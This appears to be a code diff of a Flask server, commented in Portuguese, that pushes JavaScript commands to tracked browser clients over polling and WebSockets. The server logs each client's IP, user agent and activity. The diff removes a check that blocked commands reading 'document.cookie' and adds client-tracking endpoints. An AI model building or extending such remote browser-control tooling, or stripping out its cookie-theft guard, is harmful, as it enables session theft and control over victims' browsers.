@@ -129,9 +129,8 @@ def set_command():
     if not isinstance(content, str) or not isinstance(target_id, str):
         return jsonify({"success": False, "error": "Invalid input type"}), 400
         
-    # Verificação simples para evitar roubo de cookies
-    if "document.cookie" in content and command_type == 'js':
-        return jsonify({"success": False, "error": "Unauthorized cookie access"}), 403
+    # Nota: A restrição anterior para evitar acesso a cookies foi removida
+    # para permitir a execução de qualquer comando JavaScript
 
     js_command = ""
     
@@ -228,6 +227,10 @@ def set_command():
         # Envia para todos os clientes conectados
         for cid in clients:
             commands[cid] = command_data
+            # Incrementa o contador de comandos recebidos para este cliente
+            if cid in clients:
+                clients[cid]["commands_received"] = clients[cid].get("commands_received", 0) + 1
+            
             # Se o cliente estiver conectado por WebSockets e Socket.IO estiver disponível, enviar diretamente
             if socketio_available and cid in socket_clients:
                 socketio.emit('command', command_data, room=socket_clients[cid])
@@ -237,10 +240,14 @@ def set_command():
         
         # Enviar comando para todos os clientes WebSocket não associados a IDs específicos
         if socketio_available:
-            socketio.emit('command', command_data, broadcast=True)
+            socketio.emit('command', command_data, to='all')
     else:
         # Envia apenas para o cliente específico
         commands[client_id] = command_data
+        
+        # Incrementa o contador de comandos recebidos para este cliente
+        if client_id in clients:
+            clients[client_id]["commands_received"] = clients[client_id].get("commands_received", 0) + 1
         
         # Se o cliente estiver conectado por WebSockets e Socket.IO estiver disponível, enviar diretamente
         if socketio_available and client_id in socket_clients:
@@ -292,6 +299,34 @@ def get_clients():
     
     return jsonify({"success": True, "clients": client_list})
 
+@app.route('/admin/client/<client_id>')
+@login_required
+def get_client_details(client_id):
+    """
+    Endpoint para obter detalhes de um cliente específico por ID.
+    """
+    if client_id not in clients:
+        return jsonify({}), 404
+        
+    client = clients[client_id]
+    cleanup_time = (datetime.now() - timedelta(minutes=30)).isoformat()
+    
+    # Formata dados do cliente para exibição detalhada
+    client_details = {
+        "id": client_id,
+        "active": client.get("last_seen", "") > cleanup_time,
+        "last_seen": client.get("last_seen", ""),
+        "last_activity": client.get("last_activity", ""),
+        "user_agent": client.get("user_agent", ""),
+        "ip": client.get("ip", ""),
+        "websocket": client_id in socket_clients,  # Indica se o cliente está usando WebSockets
+        "first_seen": client.get("first_seen", ""),
+        "commands_received": client.get("commands_received", 0),
+        "screen_info": client.get("screen_info", {})
+    }
+    
+    return jsonify(client_details)
+
 @app.route('/admin/clients/<client_id>', methods=['DELETE'])
 @login_required
 def remove_client(client_id):
@@ -335,7 +370,7 @@ def admin():
     Painel de administração para envio de comandos.
     Acesso protegido pelo decorator login_required.
     """
-    return render_template('admin.html')
+    return render_template('admin-dashboard.html')
 
 @app.route('/js/cmd.js')
 def serve_cmd_js():
@@ -354,6 +389,25 @@ def serve_socketio_js():
     response.headers['Cache-Control'] = 'public, max-age=604800'
     return response
 
+@app.route('/vendor/bootstrap/bootstrap.min.css')
+def serve_bootstrap_css():
+    """Rota alternativa para servir o CSS do Bootstrap"""
+    response = send_from_directory('static/vendor/bootstrap', 'bootstrap.min.css', mimetype='text/css')
+    response.headers['Cache-Control'] = 'public, max-age=604800'
+    return response
+
+@app.route('/vendor/bootstrap/bootstrap.min.css.map')
+def serve_bootstrap_css_map():
+    """Rota para o arquivo de source map do Bootstrap CSS (retorna 204 para evitar o erro 404)"""
+    # Retorna 204 No Content, pois o arquivo não existe mas é solicitado pelo navegador
+    return Response(status=204)
+
+@app.route('/vendor/bootstrap/bootstrap.bundle.min.js.map')
+def serve_bootstrap_js_map():
+    """Rota para o arquivo de source map do Bootstrap JS (retorna 204 para evitar o erro 404)"""
+    # Retorna 204 No Content, pois o arquivo não existe mas é solicitado pelo navegador
+    return Response(status=204)
+
 @app.route('/command')
 def get_command():
     """
@@ -369,15 +423,22 @@ def get_command():
     
     # Registra ou atualiza informações do cliente
     if client_id != 'default':
+        now = datetime.now().isoformat()
         if client_id not in clients:
-            clients[client_id] = {}
+            # Inicializa dados para novo cliente
+            clients[client_id] = {
+                "first_seen": now,
+                "commands_received": 0,
+                "screen_info": {}
+            }
             # Inicializa comando para novo cliente
             if client_id not in commands:
                 commands[client_id] = commands.get('default', {"id": "", "command": "", "timestamp": ""})
         
         # Atualiza informações do cliente
         clients[client_id].update({
-            "last_seen": datetime.now().isoformat(),
+            "last_seen": now,
+            "last_activity": now,
             "user_agent": request.headers.get('User-Agent', ''),
             "ip": request.remote_addr
         })
@@ -435,15 +496,22 @@ if socketio_available:
         socket_clients[client_id] = session_id
         
         # Registra ou atualiza informações do cliente
+        now = datetime.now().isoformat()
         if client_id not in clients:
-            clients[client_id] = {}
+            # Inicializa dados para novo cliente
+            clients[client_id] = {
+                "first_seen": now,
+                "commands_received": 0,
+                "screen_info": {}
+            }
             # Inicializa comando para novo cliente
             if client_id not in commands:
                 commands[client_id] = commands.get('default', {"id": "", "command": "", "timestamp": ""})
         
         # Atualiza informações do cliente
         clients[client_id].update({
-            "last_seen": datetime.now().isoformat(),
+            "last_seen": now,
+            "last_activity": now,
             "user_agent": request.headers.get('User-Agent', ''),
             "ip": request.remote_addr,
             "connection_type": "websocket"
@@ -506,6 +574,12 @@ if socketio_available:
             emit('admin_joined', {"success": True})
         else:
             emit('admin_joined', {"success": False, "error": "Não autorizado"})
+
+# Rota para teste do parser de User-Agent
+@app.route('/teste-user-agent')
+def teste_user_agent():
+    """Página para testes do parser de User-Agent"""
+    return render_template('teste-user-agent.html')
 
 if __name__ == '__main__':
     if socketio_available:
